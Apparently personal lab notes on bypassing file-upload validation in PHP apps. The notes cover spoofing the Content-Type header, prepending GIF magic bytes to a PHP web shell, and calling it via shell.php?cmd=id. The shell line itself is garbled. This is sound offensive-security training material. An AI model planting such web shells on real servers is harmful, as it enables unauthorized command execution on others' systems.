`Only images are allowed` our case study

many modern web servers and web applications also test the content of the uploaded file to ensure it matches the specified type.

There are two common methods for validating the file content: `Content-Type` Header or `File Content`

`Content-Type Header`:
```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

our browsers set this, this operation is a client-side operation,

Discovery/Web-Content/web-all-content-types.txt

https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt

```bash
AhmaDb0x@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
AhmaDb0x@htb[/htb]$ cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```
run the above scan to find what Content-Types are allowed.

`Content-Type: image/jpeg`  ::::
This tells the server, **"Hey, this file is a JPEG image!"**

Some servers check the **first few bytes** (magic bytes) of a file to detect if itâ€™s truly an image
A **real JPEG** starts with these bytes <> `FF D8 FF E0`

**fake an image by adding image magic bytes** before PHP code:
```php
GIF89a; <?phstem($_GET['cmd']); ?>
```



![[ttxr8iu7.png]]

`File successfully uploaded`
```
http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
```
----


>**Note:** A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as `POST` data), in which case we will need to modify the main Content-Type header.

----------

## MIME-Type


The second and more common type of file content validation is testing the uploaded file's `MIME-Type`. `Multipurpose Internet Mail Extensions (MIME)` is an internet standard that determines the type of a file through its general format and bytes structure.


done by inspecting the first few bytes of the file's content, which contain the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime).

example, if a file starts with (`GIF87a` or `GIF89a`), this indicates that it is a `GIF` image

plaintext is usually considered a `Text` file

>change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image >< regardless of its remaining content or extension


>Many other image types have non-printable bytes for their file signatures


```bash
AhmaDb0x@htb[/htb]$ echo "this is a text file" > text.jpg 
AhmaDb0x@htb[/htb]$ file text.jpg 
text.jpg: ASCII text
```
`type is `ASCII text`, even though its extension is `.jpg``

```bash
AhmaDb0x@htb[/htb]$ echo "GIF8" > text.jpg 
AhmaDb0x@htb[/htb]$file text.jpg
text.jpg: GIF image data
```

back-end:
```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

![[5aymkfjt.png]]
`File successfully uploaded`

but check client-valid > black-list > white-list

```bash
http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
```

